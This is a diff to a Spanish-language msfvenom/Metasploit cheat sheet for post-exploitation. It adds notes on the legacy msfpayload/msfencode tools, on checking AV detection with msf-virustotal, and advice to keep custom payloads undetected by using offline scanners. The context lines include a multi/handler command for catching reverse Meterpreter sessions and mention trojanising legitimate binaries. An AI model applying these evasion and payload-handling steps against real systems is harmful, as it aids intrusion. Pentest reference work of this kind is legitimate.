@@ -4,6 +4,8 @@ aliases:
   - msfvenom - matriz
   - msfvenom cheatsheet
   - multi/handler
+  - msfpayload
+  - msfencode
 tags:
   - meta/referencia
   - dominio/post-explotacion
@@ -18,6 +20,9 @@ tags:
 > Las líneas de comando superan el ancho de la ventana. Scrolleá o apagá el ajuste con `<leader>uw`.
 
 `ATACANTE`/`PUERTO` = `LHOST`/`LPORT` de tu handler. Sin datos de objetivo real.
+
+> [!note] `msfpayload` y `msfencode` son esto
+> En 2015 Metasploit unificó `msfpayload` (generaba) y `msfencode` (codificaba) en **`msfvenom`**. Si lo ves en un writeup viejo, es esta matriz: `msfpayload X O > out` ≈ `msfvenom -p X -f raw -o out`, y el pipe a `msfencode` ≈ el flag `-e`.
 
 ## Forma general
 ```sh
@@ -75,11 +80,19 @@ El payload PHP/JSP hay que envolverlo con `<?php ... ?>` o guardarlo como espera
 | Plantilla legítima (binario real) | `-x` | `-x plantilla.exe -k` (`-k` mantiene el original funcionando) |
 
 
+## Comprobar la detección — msf-virustotal
+
+`msf-virustotal -k <APIKEY> -f payload.exe`
+Utilidad `msf-*` del framework: consulta VirusTotal por el **hash** del archivo y devuelve el ratio de detección (cuántos motores lo marcan). Pide una API key de VT.
+
+> [!warning] Nunca subas un payload operativo a VirusTotal
+> VT **comparte las muestras con los vendors de AV**. Si la consulta no encuentra el hash y termina **subiendo** el archivo, tu payload custom queda en manos de todos los motores en horas: lo firman y lo quemás para siempre, no solo contra este objetivo. En engagement: consultá por hash de algo ya público, o usá un escáner **privado/offline** (antiscan.me, o una VM con el AV del objetivo **sin red**). El ratio de VT sobre un payload default solo confirma lo obvio —está firmado— y a cambio lo filtrás.
+
 ## Atrapar la sesión — multi/handler
 ```sh
 msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST ATACANTE; set LPORT PUERTO; set ExitOnSession false; exploit -j"
 ```
-`PAYLOAD`, `LHOST` y `LPORT` deben coincidir **exactos** con los de msfvenom. `exploit -j` lo deja en segundo plano (`-j` = job); `sessions -i N` entra a la sesión N. Para una shell simple (no Meterpreter), un `nc -lvnp PUERTO` alcanza — ver [[Reverse y bind shells - matriz de referencia]] § listeners.
+`PAYLOAD`, `LHOST` y `LPORT` deben coincidir **exactos** con los de msfvenom. `exploit -j` lo deja en segundo plano (`-j` = job); `sessions -i N` entra a la sesión N. Para una shell simple (no Meterpreter), un `nc -lvnp PUERTO` alcanza — ver [[Reverse y bind shells - matriz de referencia]] § listeners. Manejar la sesión, Meterpreter y el pivoting: [[Metasploit - matriz de referencia]].
 
 ## Errores frecuentes
 
